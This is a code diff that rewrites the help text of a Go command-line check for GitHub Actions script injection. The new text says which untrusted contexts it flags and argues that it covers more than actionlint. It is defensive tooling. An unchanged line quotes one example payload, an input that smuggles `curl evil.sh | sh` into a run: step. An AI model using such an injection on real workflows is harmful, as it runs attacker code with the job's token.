@@ -14,13 +14,21 @@ func Cmd() *cobra.Command {
 			"interpolated value becomes SYNTAX rather than data. A workflow_dispatch input of\n" +
 			"`v1\"; curl evil.sh | sh #` interpolated into a run: line executes the curl, with\n" +
 			"whatever the job's token can reach.\n\n" +
-			"Checks both this repo's workflows and instance-template's — the delivered ones\n" +
-			"matter most, because an injection there is every adopter's. Flags `inputs.*` and\n" +
-			"`github.event.*`: set by whoever dispatches or calls the workflow, and by whoever\n" +
-			"opened the pull request.\n\n" +
+			"Checks four trees — this repo's workflows and composite actions, and the\n" +
+			"delivered copies of both under instance-template/. The delivered ones matter\n" +
+			"most, because an injection there is every adopter's, and the actions matter\n" +
+			"because actionlint cannot read them at all. Flags what someone\n" +
+			"outside this repo can set: `inputs.*` and `github.event.*` (whoever dispatches or\n" +
+			"calls the workflow, and whoever opened the pull request), the branch-name\n" +
+			"contexts, bare `github` for `toJSON(github)`, and `env.*` — which is the remedy's\n" +
+			"own back door. A literal `matrix:` is safe; one built from an input is not.\n\n" +
 			"The fix is always the same — move it to `env:`, where the shell expands it after\n" +
 			"parsing and it cannot become syntax.\n\n" +
-			"NOT COVERED BY actionlint: measured, it exits 0 on this shape.",
+			"A SUPERSET OF actionlint, not a duplicate of it: measured, actionlint flags\n" +
+			"its own untrusted-input list (github.head_ref, the event title/body fields) and\n" +
+			"exits 0 on inputs.*, github.event.inputs.*, toJSON(github), and on anything\n" +
+			"routed through env: — even the values it flags inline. It also cannot parse an\n" +
+			"action.yml at all, so it has never rendered a verdict on a composite action.",
 		Args: cobra.NoArgs,
 		RunE: func(cmd *cobra.Command, _ []string) error {
 			return Run(root, cmd.OutOrStdout(), cmd.ErrOrStderr())
